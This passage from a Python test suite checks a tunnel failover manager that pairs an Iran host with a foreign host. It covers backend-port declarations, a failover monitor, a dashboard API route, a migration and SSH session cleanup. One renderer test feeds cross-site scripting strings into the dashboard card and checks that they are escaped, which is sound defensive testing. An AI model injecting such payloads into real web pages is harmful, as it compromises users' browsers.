        self.assertEqual(answered.backend_state, "answered")
        self.assertEqual(answered.status, "DOWN",
                         f"100% loss with a live backend is an outage: {answered.details}")
        frontend_read = check(backend_port=None, listeners=(22, 8898))
        self.assertEqual(frontend_read.backend_state, "answered",
                         "with no declaration the delivery end is the frontend")
        declared = check(backend_port=18080, listeners=(22, 8898))
        self.assertEqual(declared.status, "TRANSPORT-ONLY",
                         "a listener on the frontend is not a listener on the declared port")
        self.assertGreater(float(storage.get_pair(pid)["backend_checked_at"]), before - 1.0)

        # ---- 4. The monitor reports it and disarms: no streak, no switchover authorised.
        mon = failover_monitor.FailoverMonitor(pair_source=lambda: [], dry_run=True,
                                               host_guard=failover_monitor.NullHostGuard())
        mon._streak[pid] = 2
        mon._armed.add(pid)
        verdict, detail, streak = mon._classify_for(pid, rep)
        self.assertEqual(verdict, "NO_BACKEND", detail)
        self.assertEqual(streak, 0, detail)
        self.assertNotIn(pid, mon._streak, "the outage streak kept counting past a non-outage")
        self.assertNotIn(pid, mon._armed, "an absent application armed a switchover")
        self.assertIn("observing, not healing", detail)

        # ---- 5. evaluate_and_heal refuses on the same verdict, and the refusal is not a policy flag.
        res = failover.FailoverManager().evaluate_and_heal(pair_spec(), health=rep, dry_run=True,
                                                           heal_on_degraded=True)
        self.assertEqual(res["action"], "SKIP_NO_BACKEND", res)
        self.assertIn("cannot start an application", res["reason"])
        res2 = failover.FailoverManager().evaluate_and_heal(pair_spec(), health=answered, dry_run=True)
        self.assertNotEqual(res2["action"], "SKIP_NO_BACKEND",
                            f"a real outage was excused as an absent application: {res2}")

        # ---- 6. Both pair shapes the live monitor can be built from carry the declaration. A monitor
        # that reads the frontend instead misdiagnoses the transport, so this is the seam the whole
        # feature depends on and it is the one a `row.get("frontend_port")` line could silently lose.
        for label, source in (("pairs_from_storage", failover_monitor.pairs_from_storage),
                              ("dashboard.monitor_pair_source", dashboard.monitor_pair_source)):
            shape = [p for p in source() if p["id"] == pid]
            self.assertEqual(len(shape), 1, f"{label} did not carry the pair")
            self.assertEqual(shape[0].get("backend_port"), 18080,
                             f"{label} drops the declared delivery port, so the monitor reads the frontend")

    def test_112_a_successor_that_cannot_honour_the_declaration_is_never_proposed(self):
        """#63 Acceptance Test: a repair that would move the delivery port is not a repair.

        With 18080 declared, every carrier and every egress proxy is out of the ranking even when its
        benchmark score is the best one on the pair, and `execute_failover` refuses the same target before
        the circuit breaker and before Stage 3 tears anything down - a switchover that ends with the
        successor delivering into the frontend instead of the application is an outage manufactured by the
        tool. The control is the pair with no declaration: the same scores then rank GRE first, which is
        what proves the refusal did the dropping rather than the ranking.
        """
        pid = storage.add_pair("backend-failover-112", self.IR_IP, self.FR_IP, 8898)
        self.addCleanup(self._forget_pair, pid)
        for proto, score in (("GRE", 91.0), ("chisel-wss", 80.0), ("wstunnel-v10", 70.0)):
            storage.record_benchmark(pid, proto, {"score": score, "throughput_mbps": 50.0},
                                     run_id="test_112")

        def spec(backend_port):
            return {"id": pid, "name": "backend-failover-112", "frontend": 8898, "frontend_port": 8898,
                    "backend_port": backend_port, "active_tunnel": "chisel-wss",
                    "iran": {"host": self.IR_IP, "port": 22},
                    "foreign": {"host": self.FR_IP, "port": 22}}

        select = failover.FailoverCandidateSelector.select_best_candidate
        self.assertEqual(select(pid, "chisel-wss", pair=spec(18080)), "wstunnel-v10",
                         "a carrier that cannot take the declared port won the ranking")
        # ---- Control: with nothing declared, the same rows rank GRE first.
        self.assertEqual(select(pid, "chisel-wss", pair=spec(None)), "GRE",
                         "an undeclared pair was refused a transport it never asked to avoid")
        self.assertEqual(select(pid, "chisel-wss"), "GRE",
                         "no pair passed at all must not change the ranking")

        # ---- The execution gate refuses, and it refuses before it touches the live tunnel.
        self._forget_audit(pid)
        mgr = failover.FailoverManager()
        # Tripped on purpose: had the breaker been consulted first, its own audit row would be the one
        # the operator saw, and the refusal would have been credited to the wrong control.
        mgr._history[pid] = [time.time()] * (mgr.max_failovers + 1)
        ir_rec, fr_rec = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
        res = mgr.execute_failover(spec(18080), current_protocol="chisel-wss", target_protocol="GRE",
                                   reason="test_112", dry_run=True, ir_runner=ir_rec, fr_runner=fr_rec)
        self.assertTrue(res.get("blocked"), res)
        self.assertIn("backend", res["reason"].lower(), res["reason"])
        self.assertEqual(res.get("attempted_protocol"), "GRE")
        self.assertEqual(ir_rec.issued() + fr_rec.issued(), "",
                         "a refused switchover still sent commands to a host")
        rows = [a for a in storage.get_audit_logs(200) if a["pair_id"] == pid]
        actions = [(a["action"], a["status"]) for a in rows]
        self.assertIn(("FAILOVER_BLOCKED", "BACKEND_REFUSAL"), actions, actions)
        self.assertNotIn(("FAILOVER_BLOCKED", "CIRCUIT_BREAKER"), actions,
                         "the breaker answered first, so the refusal below it is untestable")

        # ---- A refusal is only about the successor: leaving a carrier stays allowed. The same tripped
        # breaker must now be the one that answers, which proves the backend gate had nothing to say about
        # a declarable target rather than that the call was blocked for an unrelated reason.
        self.assertEqual(protocols.backend_port_refusal("chisel-wss", 8898, 18080), "",
                         "the target this pair can move to was refused")
        leaving = spec(18080)
        leaving["active_tunnel"] = "GRE"
        away = mgr.execute_failover(leaving, current_protocol="GRE", target_protocol="chisel-wss",
                                    reason="test_112", dry_run=True, ir_runner=ir_rec, fr_runner=fr_rec)
        actions = [(a["action"], a["status"]) for a in storage.get_audit_logs(200)
                   if a["pair_id"] == pid]
        self.assertIn(("FAILOVER_BLOCKED", "CIRCUIT_BREAKER"), actions,
                      f"the breaker never answered, so this call proves nothing about ordering: {away}")
        self.assertNotIn("backend", str(away.get("reason", "")).lower(),
                         f"a pair was stranded on the carrier it is leaving: {away['reason']}")

    def test_114_the_route_that_writes_a_topology_claim_refuses_every_way_it_could_be_misread(self):
        """#63 Acceptance Test: `/api/backend` is a text box that changes what the next deploy does.

        Three shapes a dashboard field gets wrong, each sealed here: a body without the key (a client that
        sent a malformed payload must not clear a declaration), a declaration the pair's *active* transport
        cannot honour (storing it would invite the operator to deploy a tunnel that refuses), and a changed
        declaration that leaves its old witness on the row - the card would then describe the new port with
        evidence read off the old one.
        """
        pid = storage.add_pair("backend-route-114", self.IR_IP, self.FR_IP, 8898)
        self.addCleanup(self._forget_pair, pid)
        post = lambda body: self._post_api("/api/backend", dict(body, id=pid))

        # ---- 1. The validator, before any storage is touched.
        rq = dashboard.request_backend_port
        for not_declared in (None, "", "   ", 0, "0"):
            self.assertIsNone(rq(not_declared, 8898), f"{not_declared!r} is not 'no declaration'")
        self.assertEqual(rq("18080", 8898), 18080)
        self.assertEqual(rq(18080, 8898, "chisel-wss"), 18080)
        self.assertEqual(rq(8898, 8898, "GRE"), 8898,
                         "the frontend port is not a separate delivery port, so a carrier accepts it")
        for junk in ("abc", "18.080", [], {}):
            with self.assertRaises(ValueError):
                rq(junk, 8898)
        for bad in (-1, 65536, 70000):
            with self.assertRaises(ValueError):
                rq(bad, 8898)
        self.assertEqual(rq(1, 8898), 1, "the lowest legal port was refused")
        with self.assertRaises(ValueError) as refused:
            rq(18080, 8898, "GRE")
        self.assertIn("GRE", str(refused.exception))

        # ---- 2. A declaration is stored and echoed, and a body that omits the key changes nothing.
        res = post({"backend_port": 18080})
        self.assertEqual(res["code"], 200, res)
        self.assertTrue(res["body"]["ok"], res)
        self.assertEqual(res["body"]["backend_port"], 18080)
        self.assertIn("declared 18080", res["body"]["note"])
        self.assertEqual(storage.get_pair(pid)["backend_port"], 18080)

        res = post({})
        self.assertEqual(res["code"], 400, res)
        self.assertFalse(res["body"]["ok"], res)
        self.assertIn("required", res["body"]["error"])
        self.assertEqual(storage.get_pair(pid)["backend_port"], 18080,
                         "a body without the key cleared a topology declaration")

        # ---- 3. A stored witness belongs to the port it was read from, and to nothing else.
        storage.set_pair_backend(pid, backend_state="answered")
        res = post({"backend_port": 19000})
        self.assertEqual(res["body"]["backend_state"], "", res)
        self.assertEqual(storage.get_pair(pid)["backend_state"], "",
                         "the read of :18080 was left on the row as evidence about :19000")
        self.assertIn("was 18080", res["body"]["note"])

        # ---- 4. The active transport decides whether a declaration is possible at all.
        storage.update_pair_status(pid, "ACTIVE", "GRE")
        res = post({"backend_port": 19001})
        self.assertFalse(res["body"]["ok"], res)
        self.assertIn("GRE", res["body"]["error"])
        self.assertEqual(storage.get_pair(pid)["backend_port"], 19000,
                         "a refused declaration was stored anyway")
        storage.update_pair_status(pid, "ACTIVE", "chisel-wss")

        # ---- 5. Every spelling of "clear" clears, and a pair that was already clear says so.
        res = post({"backend_port": 0})
        self.assertTrue(res["body"]["ok"], res)
        self.assertIsNone(res["body"]["backend_port"], "the 0 token wrote a value instead of clearing")
        self.assertIn("cleared", res["body"]["note"])
        for token in (None, ""):
            res = post({"backend_port": token})
            self.assertTrue(res["body"]["ok"], f"{token!r}: {res}")
            self.assertIsNone(storage.get_pair(pid)["backend_port"])
            self.assertEqual(res["body"]["note"], "unchanged",
                             f"{token!r} on an already-undeclared pair claimed a change")
            self.assertEqual(res["body"]["backend_state"], storage.get_pair(pid)["backend_state"])

        # ---- 6. A pair that does not exist is refused, and no response ever carries an address.
        res = self._post_api("/api/backend", {"id": 999999, "backend_port": 18080})
        self.assertFalse(res["body"]["ok"], res)
        payloads = [json.dumps(post({"backend_port": 18080})), json.dumps(res)]
        for blob in payloads:
            for addr in (self.IR_IP, self.FR_IP):
                self.assertNotIn(addr, blob, "a route response carried a host address")

    def test_115_the_delivery_card_says_where_the_tunnel_ends_and_what_was_read_there(self):
        """#63 Acceptance Test: the invisible half of a tunnel becomes a card, and the card is executed.

        The renderer is run over node against hand-built payloads rather than string-pinned, because every
        claim on it is a shape: what an unknown state token does, what a missing server clock does, what a
        state whose read has no timestamp does, and what markup inside a refusal or a transport name does.
        A widget that folds "not in the table" into "the table says egress" would tell an operator a
        transport is unredirectable when nobody had looked at it, so the unknown branch is asserted on
        both directions - and the page's four state labels are pinned against the storage vocabulary they
        duplicate, the way test_97 pins the sampler's source list.
        """
        # ---- 1. The duplicated vocabulary, pinned to its source.
        block = self._js_source("const BACKEND_STATE_LABEL =")
        keys = re.findall(r"^\s*'?([a-z-]+)'?\s*:", block, re.M)
        self.assertEqual(sorted(keys), sorted(storage.BACKEND_STATES),
                         "the page's state words drifted from storage's, so a stored state would render "
                         "as nothing at all")
        self.assertNotIn("healthy", keys)
        self.assertNotEqual(sorted(keys + ["healthy"]), sorted(storage.BACKEND_STATES),
                            "the pin above is insensitive: adding a word did not move it")
        meanings = self._js_source("const BACKEND_STATE_MEANING =")
        for state in storage.BACKEND_STATES:
            self.assertIn(state, meanings, f"{state} has a label but no sentence explaining it")

        # ---- 2. The payload the card is built from.
        api = self._get_api()
        self.assertEqual(api["code"], 200, api["body"])
        view = api["body"]["backend_contract"]
        self.assertEqual(sorted(view), ["declarable", "egress_proxies", "targets"], view)
        self.assertEqual(api["body"]["backend_states"], list(storage.BACKEND_STATES))
        self.assertNotIn(self.IR_IP, json.dumps(view))
        self.assertNotIn(self.FR_IP, json.dumps(view))

        pid = storage.add_pair("backend-card-115", self.IR_IP, self.FR_IP, 8898)
        self.addCleanup(self._forget_pair, pid)
        storage.update_pair_status(pid, "ACTIVE", "chisel-wss")
        storage.set_pair_backend(pid, backend_port=18080, backend_state="no-backend")
        rows = [p for p in self._get_api("127.0.0.97")["body"]["pairs"] if p["id"] == pid]
        self.assertEqual(len(rows), 1, rows)
        bc = rows[0]["backend_contract"]
        self.assertEqual(sorted(bc), ["active_protocol", "checked_at", "declarable", "declared_port",
                                      "effective_port", "kind", "refusal", "state"], sorted(bc))
        self.assertEqual((bc["declared_port"], bc["effective_port"], bc["state"], bc["declarable"]),
                         (18080, 18080, "no-backend", True), bc)
        self.assertEqual(bc["refusal"], "")

        # ---- 3. The renderer, executed.
        node = shutil.which("node")
        if not node:
            print("    [test_115] node is not installed: the delivery card is string-pinned only")
            return
        NOW = 1000000.0
        contract = {"targets": {"chisel-wss": {"kind": "reverse", "lands_on": "foreign"},
                                "GRE": {"kind": "dnat-carrier", "lands_on": "foreign"},
                                "markup-tunnel": {"kind": "<img src=x onerror=alert(1)>",
                                                  "lands_on": "<script>bad()</script>"}},
                    "declarable": ["chisel-wss"], "egress_proxies": ["singbox-vless-reality"]}

        def card(state="", declared=None, eff=8898, active="chisel-wss", refusal="", checked=0.0,
                 declarable=True):
            return {"id": pid, "name": "card", "backend_contract": {
                "active_protocol": active, "kind": "", "declared_port": declared,
                "effective_port": eff, "declarable": declarable, "refusal": refusal, "state": state,
                "checked_at": checked}}

        cases = [
            {"p": None, "now": NOW},                                                          # 0
            {"p": card(active=""), "now": NOW},                                               # 1 no transport
            {"p": card(active="singbox-vless-reality", eff=None, declarable=False,
                        refusal="singbox-vless-reality has no local delivery port to redirect",
                        state="not-applicable", checked=NOW - 30), "now": NOW},                # 2 egress
            {"p": card(active="GRE", declared=None, declarable=False, checked=NOW - 30,
                        refusal="GRE cannot be given a separate backend port in this build"),
             "now": NOW},                                                                      # 3 carrier
            {"p": card(declared=18080, eff=18080, state="no-backend", checked=NOW - 95), "now": NOW},
            {"p": card(declared=18080, eff=18080, state="unreadable", checked=NOW - 5), "now": NOW},
            {"p": card(declared=18080, eff=18080, state="<b>weird</b>", checked=NOW - 5), "now": NOW},
            {"p": card(active="markup-tunnel", eff=None, declarable=False), "now": NOW},      # 7 markup
            {"p": card(declared=18080, eff=18080, state="answered", checked=NOW - 5), "now": None},
            {"p": card(state="answered", checked=0.0), "now": NOW},                           # 9 no timestamp
            {"p": card(active="brand-new-tunnel", eff=None, declarable=False), "now": NOW},   # 10 unknown
            {"p": card(state="answered", checked=NOW + 500.0), "now": NOW},                   # 11 future read
        ]
        # Case 7 names a transport the table has an entry for, with markup inside that entry; case 10
        # names one the table does not have at all. Both have to be visible, differently.
        driver = (self._js_source("function escapeHtml(s) {") + "\n"
                  + self._js_source("const BACKEND_STATE_LABEL =") + "\n"
                  + self._js_source("const BACKEND_STATE_MEANING =") + "\n"
                  + self._js_source("const BACKEND_LANDS_LABEL =") + "\n"
                  + self._js_source("function backendRuleHtml(p, contract, states, nowSec) {") + "\n"
                  + "const inp = JSON.parse(process.argv[2]);\n"
                  + "process.stdout.write(JSON.stringify(inp.cases.map(c => backendRuleHtml("
                    "c.p, inp.contract, inp.states, c.now))));\n")
        script = os.path.join(tempfile.mkdtemp(), "backend_rule.js")
        with open(script, "w", encoding="utf-8") as fh:
            fh.write(driver)
        proc = subprocess.run([node, script, json.dumps(
            {"cases": cases, "contract": contract, "states": list(storage.BACKEND_STATES)})],
            capture_output=True, encoding="utf-8", timeout=120)
        self.assertEqual(proc.returncode, 0, proc.stderr[:400])
        shown = json.loads(proc.stdout)
        self.assertEqual(len(shown), len(cases))

        self.assertIn("یک جفت موجود را", shown[0])
        self.assertIn("اعلام کرد", shown[0])

        self.assertIn("هنوز ترنسپورت فعالی ثبت نکرده", shown[1])
        self.assertIn('id="backendPort"', shown[1],
                      "a pair with no recorded transport is exactly when a declaration should be typed")
        self.assertIn("خالی بودنش «نبودِ چیزی» نیست", shown[1])

        self.assertIn("پراکسی خروجی", shown[2])
        self.assertIn("بی‌مورد", shown[2])
        self.assertNotIn('id="backendPort"', shown[2], "the card offered a declaration the route refuses")
        self.assertIn("چون مقصد محلی ندارد", shown[2])

        self.assertIn("GRE cannot be given a separate backend port in this build", shown[3],
                      "the engine's own sentence was paraphrased instead of printed")
        self.assertIn("میزبان", shown[3])
        self.assertNotIn('id="backendPort"', shown[3])

        self.assertIn("18080", shown[4])
        self.assertIn("پشت‌بند ندارد", shown[4])
        self.assertIn("TRANSPORT-ONLY", shown[4], shown[4][:400])
        self.assertIn("95 ثانیه پیش", shown[4])
        self.assertIn('id="backendPort"', shown[4])
        self.assertIn("پاک کردن اعلام", shown[4])

        self.assertIn("خوانده نشد", shown[5])
        self.assertIn("شواهد مبهم هیچ نوشتنی را مجاز نمی‌کند", shown[5])

        self.assertIn("&lt;b&gt;weird&lt;/b&gt;", shown[6], "an unknown token was swallowed instead of shown")
        self.assertNotIn("<b>weird</b>", shown[6])
        self.assertIn("واژگان صفحه این وضعیت را نمی‌شناسد", shown[6])

        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", shown[7])
        self.assertIn("&lt;script&gt;bad()&lt;/script&gt;", shown[7])
        self.assertNotIn('<img src=x', shown[7])
        self.assertNotIn('<script>bad', shown[7])

        self.assertIn("ساعت سرور خوانده نشد", shown[8],
                      "an age computed without a clock is a number with no meaning")
        self.assertNotIn("0 ثانیه پیش", shown[8],
                         "`Number(null)` is 0, so an absent clock was rendered as the freshest reading")

        self.assertIn("این وضعیت زمانِ خوانش ندارد", shown[9])
        self.assertIn("پشت‌بند پاسخ داد", shown[9])

        self.assertIn("در جدول قرارداد تحویل نیست", shown[10])
        self.assertIn("فیلد اعلام هم نمایش داده نمی‌شود", shown[10],
                      "an unknown transport was folded into the 'not redirectable' sentence")
        self.assertNotIn('id="backendPort"', shown[10])
        self.assertNotIn("پراکسی خروجی", shown[10],
                         "no entry in the table was reported as an egress proxy")

        self.assertIn("هم‌خوان نیست", shown[11], shown[11][-500:])
        self.assertNotIn("ثانیه پیش", shown[11],
                         "a record from the future was aged as if the clocks agreed")

        for i, html in enumerate(shown):
            self.assertNotIn(self.IR_IP, html, f"case {i} rendered an address")
            self.assertNotIn(self.FR_IP, html, f"case {i} rendered an address")

        # ---- 4. The card is wired: it is called when a pair is selected, cleared when the form is, and
        # it reads the vocabulary the server sent rather than a copy frozen in the page.
        page = dashboard.PAGE
        self.assertIn("renderBackendRule(p);", page)
        self.assertIn("renderBackendRule(null);", page)
        self.assertIn("backendContract = data.backend_contract || null;", page)
        self.assertIn("backendStates = data.backend_states || [];", page)
        self.assertIn('id="backendRule"', page)
        self.assertIn("function postBackend(value, okMessage)", page)
        self.assertIn("function declareBackend()", page)
        self.assertIn("function clearBackendPort()", page)
        self.assertIn('"/api/backend"', inspect.getsource(dashboard.H.do_POST))
        self.assertEqual(re.findall(r"[Tt]elegram|webhook",
                                    page + inspect.getsource(dashboard.H.do_POST)), [],
                         "an outbound monitoring channel reappeared")

    def test_113_migration_11_stores_a_declaration_a_state_and_the_moment_the_state_was_read(self):
        """#63 Acceptance Test: the delivery end as three columns that mean what they say.

        NULL, not 0 and not the frontend, because "nobody declared one" and "declared port 0" are different
        sentences - and every reader downstream would otherwise have to re-decode a sentinel. The state
        carries its own timestamp for the same reason the capacity rows do: a read from 03:00 is not a read
        from 15:00, and a card that renders one without saying when has turned a measurement into a claim.
        """
        with storage.db_session() as conn:
            cols = storage.get_column_names(conn, "pairs")
            info = {r["name"]: r for r in conn.execute("PRAGMA table_info(pairs)").fetchall()}
        for new in ("backend_port", "backend_state", "backend_checked_at"):
            self.assertIn(new, cols, f"migration 11 did not add {new}")
        self.assertIsNone(info["backend_port"]["dflt_value"],
                          "backend_port gained a DEFAULT, so a historical pair now reads as declared")
        self.assertEqual(info["backend_state"]["dflt_value"], "''")

        pid = storage.add_pair("backend-contract-113", self.IR_IP, self.FR_IP, 8898)
        self.addCleanup(self._forget_pair, pid)
        row = storage.get_pair(pid)
        self.assertIsNone(row["backend_port"], "a new pair came with a declaration it was never given")
        self.assertEqual(row["backend_state"], "", "a new pair claims a delivery read it never made")
        self.assertEqual(float(row["backend_checked_at"]), 0.0)

        # ---- 1. A declaration alone does not invent a measurement.
        self.assertTrue(storage.set_pair_backend(pid, backend_port=18080))
        row = storage.get_pair(pid)
        self.assertEqual(row["backend_port"], 18080)
        self.assertEqual(row["backend_state"], "", "storing a port also stored a state nobody read")
        self.assertEqual(float(row["backend_checked_at"]), 0.0)

        # ---- 2. A state refresh does not rewrite the operator's declaration.
        self.assertTrue(storage.set_pair_backend(pid, backend_state="no-backend"))
        row = storage.get_pair(pid)
        self.assertEqual(row["backend_port"], 18080)
        self.assertEqual(row["backend_state"], "no-backend")
        self.assertGreater(float(row["backend_checked_at"]), 0.0)

        # ---- 3. Only the vocabulary the monitor has branches for is storable.
        for bad in ("healthy", "HEALTHY", "no_backend", " None", "0"):
            with self.assertRaises(ValueError):
                storage.set_pair_backend(pid, backend_state=bad)
        self.assertEqual(storage.BACKEND_STATES, ("answered", "no-backend", "unreadable",
                                                  "not-applicable"))
        for good in storage.BACKEND_STATES:
            self.assertTrue(storage.set_pair_backend(pid, backend_state=good))

        # ---- 4. A port outside the range is refused, and 0 is the clear token rather than a port.
        for bad_port in (0, -1, 65536, 70000):
            if bad_port == 0:
                continue
            with self.assertRaises(ValueError):
                storage.set_pair_backend(pid, backend_port=bad_port)
        self.assertTrue(storage.set_pair_backend(pid, backend_port=0))
        self.assertIsNone(storage.get_pair(pid)["backend_port"],
                          "the clear token wrote a value instead of removing the declaration")

        # ---- 5. The audit trail carries transitions, not confirmations.
        self._forget_audit(pid)
        storage.set_pair_backend(pid, backend_state="answered")
        storage.set_pair_backend(pid, backend_state="answered")
        storage.set_pair_backend(pid, backend_state="answered")
        lines = [a for a in storage.get_audit_logs(200) if a["pair_id"] == pid and a["action"] == "BACKEND"]
        self.assertEqual(len(lines), 1, lines)
        self.assertIn("not-applicable -> answered", lines[0]["details"],
                      "the change the operator needs is the transition, and it is the line that must survive")

        storage.set_pair_backend(pid, backend_port=19000)
        lines = [a for a in storage.get_audit_logs(200) if a["pair_id"] == pid and a["action"] == "BACKEND"]
        self.assertEqual(len(lines), 2, lines)
        self.assertIn("19000", lines[0]["details"])

        # No address ever enters these columns or their audit lines, whatever the caller passed in.
        for a in storage.get_audit_logs(200):
            if a["pair_id"] == pid:
                self.assertNotIn(self.FR_IP, a["details"])
                self.assertNotIn(self.IR_IP, a["details"])

    def test_116_no_session_is_opened_outside_the_guard_that_closes_it(self):
        """#72 Acceptance Test (round 065): #71 was a class, and this is the rest of it.

        The finding in report063 was one line of prose - "the same ordering survives in the switchover
        path" - carried as `failover.py:359-364` from `test_98`'s own docstring. Re-measured here against
        the current tree, that anchor names *no* session site at all (the census prints `0` for it): the
        function was renamed and moved, and the claim stayed. So the claim was replaced with an
        instrument, `scratch/session_close_census_065.py`, which asks a structural question of every
        session-producing assignment in the product - is a `Try` node on the way out to its function? -
        and it found eight sites at risk, not one: `execute_failover`, `run_single_benchmark` (both the
        helper's sessions and each single-host branch) and `deploy_tunnel`'s two gate windows.

        `deploy_tunnel` is the reason the guard closes and re-raises rather than being folded into the
        main `try`: its carrier gates must stay outside that block, because entering the `except` would
        run the rollback branch and tear down the tunnel that is carrying traffic - an outage caused by
        declining to make a change, which is what those gates exist to prevent. The refusal messages and
        their order are unchanged, and section 5 asserts that.

        Both directions are pinned: the seal must report the pre-fix ordering, and must stay silent on
        the fixed one, before "zero findings on the shipped tree" is worth anything.
        """
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        here = os.path.join(os.path.dirname(mock_ssh.__file__))

        # ---- 1. The seal, shown able to fail and able to pass.
        self.assertEqual([fn for fn, _line in unguarded_opens(_SEVENTY_TWO_BEFORE)],
                         ["execute_failover", "execute_failover"],
                         "the pre-fix ordering opens both hosts outside any try; a seal that cannot see "
                         "that is a seal that reports zero findings for every tree")
        self.assertEqual(unguarded_opens(_SEVENTY_TWO_AFTER), [],
                         "the guard that closes and re-raises is the fix, so the same seal has to read "
                         "it as discharged - otherwise it is counting opens, not judging them")

        # ---- 2. The shipped tree, module by module, with the one exception named rather than absorbed.
        # The list is the tree the census judges, not the four modules that happened to be edited when
        # this test was written: a seal that reads fewer files than the instrument it pins reports
        # "only engine.py" about a tree it never looked at.
        reported = {}
        for mod in ("engine.py", "dashboard.py", "failover.py", "failover_monitor.py", "protocols.py",
                    "storage.py", "mock_ssh.py", "safety.py", "verify_checksums.py",
                    "vet_reality_covers.py"):
            with open(os.path.join(here, mod), encoding="utf-8") as fh:
                sites = unguarded_opens(fh.read())
            if sites:
                reported[mod] = sites
        self.assertEqual(list(reported), ["engine.py"],
                         f"only the pair-session helper may open outside a try: {reported}")
        self.assertEqual([fn for fn, _line in reported["engine.py"]], ["_open_pair_sessions"], reported)
        with open(os.path.join(here, "engine.py"), encoding="utf-8") as fh:
            engine_src = fh.read()
        helper = [f for f in ast.walk(ast.parse(engine_src)) if isinstance(f, ast.FunctionDef)
                  and f.name == "_open_pair_sessions"][0]
        body = [st for st in helper.body if not (isinstance(st, ast.Expr)
                                                 and isinstance(st.value, ast.Constant)
                                                 and isinstance(st.value.value, str))]
        self.assertIsInstance(body[0], ast.Assign)
        self.assertEqual(_callee_of(body[0].value), "get_ssh_runner",
                         "the one tolerated unguarded open has to be the *first* statement: it strands "
                         "nothing because nothing was open before it, and that is the whole argument")
        self.assertEqual([line for _fn, line in reported["engine.py"]], [body[0].lineno],
                         "the site the seal reported is not the one this argument covers")
        self.assertTrue(any(isinstance(st, ast.Try) for st in helper.body),
                        "and the second open has to be inside a try that closes the first")

        # ---- 3. `execute_failover`: a Foreign host that will not answer must not keep the Iran session.
        pid = storage.add_pair(name=f"s72fo_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(self._forget_pair, pid)
        pair = {"id": pid, "name": "s72", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}
        made = []

        def strand_on_second(spec, dry_run=None, host_role="unknown"):
            if host_role == "foreign":
                raise ConnectionResetError("Error reading SSH protocol banner")
            made.append(RecordingRunner(host_role=host_role))
            return made[-1]

        real_fo_factory = failover.get_ssh_runner
        failover.get_ssh_runner = strand_on_second
        try:
            with self.assertRaises(ConnectionError):
                failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=10
                                         ).execute_failover(pair, "GRE", "chisel-wss",
                                                            reason="#72 witness", dry_run=False)
        finally:
            failover.get_ssh_runner = real_fo_factory
        self.assertEqual([r.host_role for r in made], ["iran"],
                         "the witness has to reach the failure it claims to reproduce")
        self.assertFalse(any(r.connected for r in made),
                         "execute_failover stranded the session it had already authenticated")
        self.assertEqual(made[0].issued(), "",
                         "a switchover that never got its second host must not have touched the first")

        # ---- 4. `run_single_benchmark`: the prologue between the open and the body is where it leaked.
        pid = storage.add_pair(name=f"s72sb_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(self._forget_pair, pid)
        bench_pair = dict(pair, id=pid)
        real_factory = engine.get_ssh_runner
        real_measure = engine.measure_direct_base_rtt
        made = []

        def factory(spec, dry_run=None, host_role="unknown"):
            made.append(RecordingRunner(host_role=host_role))
            return made[-1]

        def dying_measure(ir_runner, fr_ip, dry_run=None):
            # The baseline probe is the statement the census named: it runs on the Iran session, before
            # the `try` whose `finally` owns that session.
            raise mock_ssh.TransientTransportError("Error reading SSH protocol banner")

        engine.get_ssh_runner, engine.measure_direct_base_rtt = factory, dying_measure
        try:
            with self.assertRaises(mock_ssh.TransientTransportError):
                engine.run_single_benchmark(bench_pair, "GRE", dry_run=False)
        finally:
            engine.get_ssh_runner, engine.measure_direct_base_rtt = real_factory, real_measure
        self.assertEqual(sorted(r.host_role for r in made), ["foreign", "iran"],
                         "the sweep opens one session per host before it measures anything")
        for runner in made:
            self.assertFalse(runner.connected,
                             f"run_single_benchmark stranded its {runner.host_role} session, one per "
                             f"failed protocol row per sweep")
            self.assertNotIn("fuser -k", runner.issued(),
                             "the guard closes and re-raises; entering the benchmark body would have "
                             "issued teardown against hosts it never deployed to")

        # ---- 5. `deploy_tunnel`: a gate read that dies must not strand both, and must not roll back.
        class DyingRunner(RecordingRunner):
            """The real shape of the window: the refusal is not the only way a gate fails."""

            def run(self, cmd, **kwargs):
                if "PREROUTING" in cmd:
                    raise mock_ssh.TransientTransportError("Error reading SSH protocol banner")
                return super().run(cmd, **kwargs)

        pid = storage.add_pair(name=f"s72dt_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(self._forget_pair, pid)
        deploy_pair = dict(pair, id=pid)
        made = []

        def dying_factory(spec, dry_run=None, host_role="unknown"):
            made.append(DyingRunner(host_role=host_role))
            return made[-1]

        engine.get_ssh_runner = dying_factory
        try:
            with self.assertRaises(mock_ssh.TransientTransportError):
                engine.deploy_tunnel(pair=deploy_pair, choice="GRE", dry_run=False,
                                     force_confirmed=True)
        finally:
            engine.get_ssh_runner = real_factory
        self.assertEqual(sorted(r.host_role for r in made), ["foreign", "iran"],
                         "both sessions were opened before the gate read died")
        for runner in made:
            self.assertFalse(runner.connected,
                             f"deploy_tunnel stranded its {runner.host_role} session")
            self.assertNotIn("systemctl stop", runner.issued(),
                             "a gate that could not be read must not fall into the rollback branch - "
                             "that is the outage the gate exists to avoid")
            self.assertNotIn("-A PREROUTING", runner.issued(),
                             "an unreadable chain is not a clear one; nothing may be installed")

        # ---- 6. The refusal path itself is byte-identical, and now closes through the same guard.
        foreign_rule = (f"-A PREROUTING -p tcp -m tcp --dport 9443 -m comment --comment "
                        f"{safety.generate_firewall_comment('9999-prod', 'GRE')} "
                        f"-j DNAT --to-destination 10.99.99.2:9443")
        pid = storage.add_pair(name=f"s72rf_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(self._forget_pair, pid)
        refused_pair = dict(pair, id=pid)
        made = []

        def conflicted(spec, dry_run=None, host_role="unknown"):
            made.append(RecordingRunner(host_role=host_role))
            if host_role == "iran":
                made[-1].state["prerouting"] = [foreign_rule]
            return made[-1]

        engine.get_ssh_runner = conflicted
        try:
            with self.assertRaises(ValueError) as refused:
                engine.deploy_tunnel(pair=refused_pair, choice="GRE", dry_run=False,
                                     force_confirmed=True)
        finally:
